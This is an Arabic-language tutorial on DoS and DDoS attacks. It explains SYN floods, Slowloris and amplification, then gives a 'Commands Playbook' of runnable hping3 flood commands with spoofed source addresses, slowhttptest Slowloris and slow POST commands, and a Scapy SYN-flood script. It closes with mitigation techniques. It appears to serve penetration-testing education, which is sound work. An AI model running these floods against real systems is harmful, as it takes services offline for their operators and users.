📚 النظرية — كيف تعمل هجمات DoS & DDoS

هدف هجمات DoS (Denial of Service) و DDoS (Distributed Denial of Service) هو منع المستخدمين الشرعيين من الوصول إلى الخدمات أو الموارد (تدمير Availability).

📊 تصنيف الهجمات حسب طبقات OSI

  • L3/L4 (Network & Transport Layer): استهداف قنوات الاتصال والـ Port Resources. مثل (SYN Flood, UDP Flood, ICMP Flood). تعتمد على إرسال كميات هائلة من الحزم (Volumetric).
  • L7 (Application Layer): استهداف تطبيقات الويب وقواعد البيانات مباشرة. تستهلك موارد الخادم (CPU, RAM) عبر طلبات تبدو طبيعية ولكنها مكثفة أو بطيئة جداً. مثل (HTTP Flood, Slowloris, XML/JSON Bomb).

⚡ هجمات الانعكاس والتضخيم (Reflection & Amplification)

تعتمد على إرسال طلبات صغيرة لجهات خارجية (Reflectors) تحمل عنوان IP الضحية كعنوان مرسل (IP Spoofing)، وتقوم هذه الجهات بالرد بحزم ضخمة جداً على الضحية.

  • DNS Amplification: معامل التضخيم يصل إلى 54x.
  • NTP Amplification: معامل التضخيم يصل إلى 556x.
  • Memcached Amplification: معامل التضخيم يصل إلى 50,000x!

⚠️ آلية هجوم SYN Flood بالتفصيل

يستغل هذا الهجوم مصافحة TCP الثلاثية (TCP 3-way Handshake). في الوضع الطبيعي:
Client (SYN) → Server (SYN-ACK) → Client (ACK)
أثناء الهجوم، يرسل المهاجم آلاف حزم SYN بعناوين وهمية (Spoofed IPs)، فيقوم الخادم بحجز مساحة في الـ Connection Queue (Backlog Table) ويرسل SYN-ACK وينتظر الـ ACK الأخير الذي لن يأتي أبداً. يظل الاتصال معلقاً (Half-Open Connection) حتى تمتلئ الذاكرة ويرفض الخادم أي اتصالات جديدة.

🔬 تشريح الهجوم — خطوات اختبار حجب الخدمة

1️⃣
Target Profiling & Resource Scan

تحديد المنافذ المفتوحة والخدمات وقدرات الخادم الاستيعابية.

# scan target ports nmap -p 80,443,53,123 target.com # check connection limit using apache bench (simulating 100 requests with concurrency of 10) ab -n 100 -c 10 http://target.com/
2️⃣
SYN Flood simulation (Lab environment)

إرسال حزم SYN سريعة مع تزوير عنوان المرسل لإغراق الـ Connection Queue.

# Using hping3: -S (SYN), -p (port), --flood (fast as possible), --rand-source (spoof source IPs) sudo hping3 -S -p 80 --flood --rand-source TARGET_IP
3️⃣
Slow Connection Attack (Slowloris)

فتح اتصالات HTTP وإبقاؤها مفتوحة عبر إرسال headers غير مكتملة ببطء شديد، مما يستهلك الـ Thread Pool بالكامل.

# Using slowhttptest tool: -H (Slowloris mode), -g (generate statistics), -c (connections), -r (connections per second), -t (HTTP verb) slowhttptest -H -u http://target.com -c 1000 -r 200 -t GET -i 10 -x 24 -p 3

Scapy custom DDoS scripts (For Research & Testing)

بناء سيناريوهات SYN Flood مخصصة باستخدام Scapy في بايثون:

from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    # Craft IP packet with spoofed source
    ip_pkt = IP(src=RandIP(), dst=target_ip)
    # Craft TCP SYN packet
    tcp_pkt = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1000, 9000))
    # Send packet
    send(ip_pkt/tcp_pkt, verbose=0)

# Example usage:
# syn_flood("192.168.1.50", 80)

📋 Commands Playbook — أوامر اختبار حجب الخدمة

🛡️ TCP SYN Flood (hping3)
# Basic SYN flood on port 80 sudo hping3 -S -p 80 --flood --rand-source TARGET_IP # SYN flood with specific data size (120 bytes) sudo hping3 -S -p 80 -d 120 --flood --rand-source TARGET_IP
🌊 UDP & ICMP Flood
# UDP flood on port 53 (DNS) sudo hping3 --udp -p 53 --flood --rand-source TARGET_IP # ICMP (Ping) Flood sudo hping3 -1 --flood --rand-source TARGET_IP
🕸️ Slow POST Attacks (slowhttptest)
# Slow POST: -B (Slow Read/POST mode), -c (connections), -r (connections per second) slowhttptest -B -u http://target.com -c 1000 -r 100 -s 8192 -t POST

🛡️ الحماية والدفاع — DDoS Mitigation

✅ تقنيات معالجة L3/L4 Attacks

  • SYN Cookies: تقنية برمجية في نواة نظام التشغيل تمنع حجز الـ Connection Queue إلا بعد تأكيد الـ ACK.
  • Rate Limiting: تحديد الحد الأقصى لعدد الحزم المسموح بها من نفس عنوان الـ IP.
  • Cloud Scrubbing: تحويل حركة البيانات إلى مراكز تصفية سحابية مثل Cloudflare و Akamai لعزل الحزم الضارة.

🔒 تقنيات معالجة L7 Attacks

  • Web Application Firewall (WAF): تحليل سلوك الطلبات وكشف الأنماط المتكررة أو البطيئة.
  • Connection Limits: تحديد أقصى وقت لإبقاء اتصال HTTP مفتوحاً دون استقبال بيانات (Timeout configuration).
  • CAPTCHA: فرض اختبارات التحقق البشري عند وجود شك في طبيعة حركة المرور.
